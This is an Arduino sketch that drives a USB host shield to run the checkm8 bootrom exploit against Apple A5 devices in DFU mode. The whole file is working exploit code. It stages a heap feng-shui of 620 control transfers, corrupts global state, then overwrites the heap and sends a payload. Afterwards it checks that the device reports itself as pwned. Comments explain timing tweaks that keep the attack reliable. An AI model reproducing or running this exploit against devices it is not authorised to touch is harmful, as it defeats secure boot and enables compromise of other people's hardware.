#include "Usb.h"

/* Target SoC. Default is S5L8942 (AppleTV3,1); override with the build flag
   -DA5_8940 (iPad 2 / iPhone 4S) or -DA5_8945 (iPad 3). */
#if !defined(A5_8940) && !defined(A5_8942) && !defined(A5_8945)
#define A5_8942
#endif
#include "constants.h"

USB Usb;
USB_DEVICE_DESCRIPTOR desc_buf;
uint8_t rcode;
uint8_t last_state, state;
bool is_apple_dfu = false;
uint8_t serial_idx = 0xff;

enum {
  CHECKM8_INIT_RESET,
  CHECKM8_HEAP_FENG_SHUI,
  CHECKM8_SET_GLOBAL_STATE,
  CHECKM8_HEAP_OCCUPATION,
  CHECKM8_END
};
uint8_t checkm8_state = CHECKM8_INIT_RESET;
bool exploit_aborted = false;

uint8_t send_out(uint8_t * io_buf, uint8_t pktsize)
{
  Usb.bytesWr(rSNDFIFO, pktsize, io_buf);
  Usb.regWr(rSNDBC, pktsize);
  Usb.regWr(rHXFR, tokOUT);
  while(!(Usb.regRd(rHIRQ) & bmHXFRDNIRQ));
  Usb.regWr(rHIRQ, bmHXFRDNIRQ);
  uint8_t rcode = Usb.regRd(rHRSL) & 0x0f;
  return rcode;
}

/* Read the serial string descriptor right after the exploit finishes.
   Verifying from a separate firmware would reset the board and could give a
   DFU watchdog enough idle time to drop the pwned state, which would make a
   successful run look like a failure. */
void verify_serial()
{
  uint8_t buf[128];
  /* Reading immediately after the payload write returns a half-updated
     descriptor ("CPID:...SCEP:?CPID:...") and makes a successful run look
     like a failure. Give the device a moment and re-read the descriptor. */
  delay(800);
  uint8_t rc = Usb.getDevDescr(0, 0, sizeof(desc_buf), (uint8_t *)&desc_buf);
  Serial.print("verify: re-read descriptor rc=0x");
  Serial.println(rc, HEX);
  if(rc != 0) return;

  uint8_t idx = desc_buf.iSerialNumber;
  rc = Usb.getStrDescr(0, 0, sizeof(buf), idx, 0x0409, buf);
  Serial.print("verify: serial idx=");
  Serial.print(idx);
  Serial.print(" rc=0x");
  Serial.println(rc, HEX);
  if(rc)
  {
    Serial.println("verify: could not read serial");
    return;
  }
  uint8_t len = buf[0];
  if(len > sizeof(buf)) len = sizeof(buf);
  Serial.print("verify: \"");
  for(uint8_t i = 2; i < len; i += 2)
  {
    uint8_t c = buf[i];
    if(c == 0) break;
    Serial.print((c >= 0x20 && c < 0x7f) ? (char)c : '?');
  }
  Serial.println("\"");
  if(buf[2] == 'P' && buf[4] == 'W' && buf[6] == 'N' && buf[8] == 'D')
    Serial.println("verify: PWND:[checkm8] CONFIRMED");
  else
    Serial.println("verify: serial is NOT pwned");
}

#define LED_PIN 6

/* Blink the external LED: `times` pulses of on_ms/off_ms. */
void blink_led(uint8_t times, uint16_t on_ms, uint16_t off_ms)
{
  for(uint8_t i = 0; i < times; i++)
  {
    digitalWrite(LED_PIN, HIGH);
    delay(on_ms);
    digitalWrite(LED_PIN, LOW);
    delay(off_ms);
  }
}

void setup() {
  /* The stock sketch never configured the pin as OUTPUT, so digitalWrite()
     only toggled the internal pull-up and the LED barely lit. */
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  Serial.begin(115200);
  Serial.println("checkm8 started");

  /* Power-on self test: 3 blinks right after reset, so wiring can be
     verified before any device is attached. */
  blink_led(3, 150, 150);
  Serial.println("led self-test: 3 blinks");

  if(Usb.Init() == -1)
    Serial.println("usb init error");
  delay(200);
}

void loop() {
  Usb.Task();
  state = Usb.getUsbTaskState();
  if(state != last_state)
  {
    //Serial.print("usb state: "); Serial.println(state, HEX);
    last_state = state;
  }
  if(state == USB_STATE_ERROR)
  {
    Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
  }
  if(state == USB_STATE_RUNNING)
  {
    if(!is_apple_dfu)
    {
      Usb.getDevDescr(0, 0, 0x12, (uint8_t *) &desc_buf);
      if(desc_buf.idVendor != 0x5ac || desc_buf.idProduct != 0x1227) 
      {
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        if(checkm8_state != CHECKM8_END)
        {
            Serial.print("Non Apple DFU found (vendorId: "); Serial.print(desc_buf.idVendor); Serial.print(", productId: "); Serial.print(desc_buf.idProduct); Serial.println(")");
            delay(5000);
        }
        return;
      }
      is_apple_dfu = true;
      serial_idx = desc_buf.iSerialNumber;
    }

    switch(checkm8_state)
    {
      case CHECKM8_INIT_RESET:
        blink_led(3, 500, 500);
        checkm8_state = CHECKM8_HEAP_FENG_SHUI;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        break;
      case CHECKM8_HEAP_FENG_SHUI:
        if(heap_feng_shui() != 0)
        {
          checkm8_state = CHECKM8_END;
          break;
        }
        checkm8_state = CHECKM8_SET_GLOBAL_STATE;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        break;
      case CHECKM8_SET_GLOBAL_STATE:
        set_global_state();
        checkm8_state = CHECKM8_HEAP_OCCUPATION;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        //while(Usb.getUsbTaskState() != USB_DETACHED_SUBSTATE_WAIT_FOR_DEVICE) { Usb.Task(); }
        break;
      case CHECKM8_HEAP_OCCUPATION:
        heap_occupation();
        checkm8_state = CHECKM8_END;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        break;
      case CHECKM8_END:
        if(exploit_aborted)
        {
          digitalWrite(LED_PIN, LOW);
          Serial.println("Aborted - device was not pwned, LED off");
        }
        else
        {
          digitalWrite(LED_PIN, HIGH);
          Serial.println("Done!");
        }
        checkm8_state = -1;
        verify_serial();
        break;
    }
  }

  /* Re-arm once the previously handled device is unplugged, so a retry does
     not need a manual RESET. A device that is still attached (successfully
     pwned) is deliberately left alone. */
  if(checkm8_state == 255 && Usb.getUsbTaskState() != USB_STATE_RUNNING)
  {
    checkm8_state = CHECKM8_INIT_RESET;
    exploit_aborted = false;
    is_apple_dfu = false;
    serial_idx = 0xff;
    Serial.println("re-armed, waiting for the next device");
  }

  /* Heartbeat: without this the exploit build looks dead while it is simply
     waiting for a DFU device, which makes "did it reset again?" unanswerable. */
  static uint32_t last_beat = 0;
  if (checkm8_state != CHECKM8_END && millis() - last_beat > 5000)
  {
    last_beat = millis();
    uint8_t hr = Usb.regRd(rHRSL);
    Serial.print("waiting for Apple DFU (0x5AC/0x1227), usb state=0x");
    Serial.print(Usb.getUsbTaskState(), HEX);
    Serial.print(" bus=");
    switch(hr & 0xc0)
    {
      case 0x00: Serial.print("SE0"); break;   /* nothing pulling D+ up */
      case 0x80: Serial.print("J");   break;   /* full-speed device present */
      case 0x40: Serial.print("K");   break;   /* low-speed device present */
      default:   Serial.print("SE1"); break;   /* floating / illegal */
    }
    Serial.print(" hrsl=0x");
    Serial.println(hr, HEX);
  }
}

uint8_t last_setup_rc, last_data_rc;

uint8_t heap_feng_shui_req(uint8_t sz, bool intok)
{
  uint8_t setup_rcode, data_rcode;
  setup_rcode = Usb.ctrlReq_SETUP(0, 0, 0x80, 6, serial_idx, 3, 0x40a, sz);
  uint8_t io_buf[0x40];

  if(intok)
  {
    data_rcode = Usb.dispatchPkt(tokIN, 0, 0);
    uint8_t pktsize = Usb.regRd(rRCVBC);
    Usb.bytesRd(rRCVFIFO, pktsize, io_buf);
    Usb.regWr(rHIRQ, bmRCVDAVIRQ);
  }
  else
  {
    data_rcode = 0xff;
  }
  last_setup_rc = setup_rcode;
  last_data_rc = data_rcode;
  /* Per-request printing is deliberate: it spaces out the 620 control
     transfers. Removing it changed the timing enough to break the exploit
     on devices that previously succeeded. */
  Serial.print("heap_feng_shui_req: setup status = "); Serial.print(setup_rcode, HEX);
  Serial.print(", data status = "); Serial.println(data_rcode, HEX);
  return setup_rcode;
}

/* Returns 0 when the 620 leak requests went through, -1 if the device stops
   answering. Without the abort the while() below never terminates and the
   board has to be reset by hand. */
int heap_feng_shui()
{
  Serial.println("1. heap feng-shui");

  rcode = Usb.ctrlReq(0, 0, 2, 3, 0, 0, 0x80, 0, 0, 0, 0);
  Serial.print("Stall status: "); Serial.println(rcode, HEX);
  
  Usb.regWr(rHCTL, bmRCVTOG1);
  int success = 0;
  int fails = 0;
  int dataerr = 0;
  while(success != 620)
  {
    if(heap_feng_shui_req(0x80, true) == 0)
    {
      success++;
      fails = 0;
      if(last_data_rc != 0) dataerr++;
    }
    else if(++fails > 50)
    {
      Serial.print("heap feng-shui aborted at ");
      Serial.print(success);
      Serial.print("/620, setup=0x");
      Serial.print(last_setup_rc, HEX);
      Serial.print(" data=0x");
      Serial.println(last_data_rc, HEX);
      exploit_aborted = true;
      return -1;
    }
  }
  heap_feng_shui_req(0x81, true); // no leak

  /* a8 testing
  // heap_feng_shui_req(0xc0, true); // stall
  heap_feng_shui_req(0xc0, true); // leak
  for(int i = 0; i < 40; i++)
    heap_feng_shui_req(0xc1, true); // no leak
  */
  return 0;
}

void set_global_state()
{
  Serial.println("2. set global state");

  uint8_t tmpbuf[0x40];
  memset(tmpbuf, 0xcc, sizeof(tmpbuf));

  rcode = Usb.ctrlReq_SETUP(0, 0, 0x21, 1, 0, 0, 0, 0x40);
  //Usb.regWr(rHCTL, bmSNDTOG0);
  rcode = send_out(tmpbuf, 0x40);
  Serial.print("OUT pre-packet: "); Serial.println(rcode, HEX);
  rcode = send_out(tmpbuf, 0x40);
  Serial.print("Send random 0x40 bytes: "); Serial.println(rcode, HEX);
  rcode = Usb.dispatchPkt(tokINHS, 0, 0);
  Serial.print("Send random 0x40 bytes HS: "); Serial.println(rcode, HEX);

  rcode = Usb.ctrlReq(0, 0, 0x21, 1, 0, 0, 0, 0, 0, 0, 0);
  Serial.print("Send zero length packet: "); Serial.println(rcode, HEX);

  rcode = Usb.ctrlReq(0, 0, 0xA1, 3, 0, 0, 0, 6, 6, tmpbuf, 0);
  Serial.print("Send get status #1: "); Serial.println(rcode, HEX);

  rcode = Usb.ctrlReq(0, 0, 0xA1, 3, 0, 0, 0, 6, 6, tmpbuf, 0);
  Serial.print("Send get status #2: "); Serial.println(rcode, HEX);
  
  
  rcode = Usb.ctrlReq_SETUP(0, 0, 0x21, 1, 0, 0, 0, padding + 0x40);
  uint8_t io_buf[0x40];
  for(int i = 0; i < ((padding + 0x40) / 0x40); i++)
  {
    rcode = send_out(io_buf, 0x40);
    Serial.print("    data: "); Serial.println(rcode, HEX);
    if(rcode)
    {
      Serial.println("sending error");
      checkm8_state = CHECKM8_END;
      return;
    }
  }
}

void heap_occupation()
{
  Serial.println("3. heap occupation");

  Usb.regWr(rHCTL, bmRCVTOG1);
  heap_feng_shui_req(0x81, true); // no leak

  //Serial.println("!!! Enable debugging/dump sram here !!!");
  //delay(10000);
  
  uint8_t tmpbuf[0x40];

  Serial.println("overwrite sending ...");
  rcode = Usb.ctrlReq_SETUP(0, 0, 0, 0, 0, 0, 0, 0x40);
  Serial.print("    SETUP: "); Serial.println(rcode, HEX);
  //Usb.regWr(rHCTL, bmSNDTOG0);
  memset(tmpbuf, 0xcc, sizeof(tmpbuf));
  rcode = send_out(tmpbuf, 0x40);
  Serial.print("    OUT (pre packet): "); Serial.println(rcode, HEX);
  for(int i = 0; i < 0x40; i++)
    tmpbuf[i] = pgm_read_byte(overwrite + i);
  rcode = send_out(tmpbuf, 0x40);
  Serial.print("    OUT: "); Serial.println(rcode, HEX);

  Serial.println("payload sending ...");
  rcode = Usb.ctrlReq_SETUP(0, 0, 0x21, 1, 0, 0, 0, sizeof(payload));
  Serial.print("    SETUP: "); Serial.println(rcode, HEX);
  //Usb.regWr(rHCTL, bmSNDTOG0);
  memset(tmpbuf, 0xcc, sizeof(tmpbuf));
  rcode = send_out(tmpbuf, 0x40);
  Serial.print("    OUT (pre packet): "); Serial.println(rcode, HEX);
  for(int i = 0; i < sizeof(payload); i += 0x40)
  {
    for(int j = 0; j < 0x40; j++)
      tmpbuf[j] = pgm_read_byte(payload + i + j); 
    rcode = send_out(tmpbuf, 0x40);
    Serial.print("    OUT: "); Serial.println(rcode, HEX);
  }
}
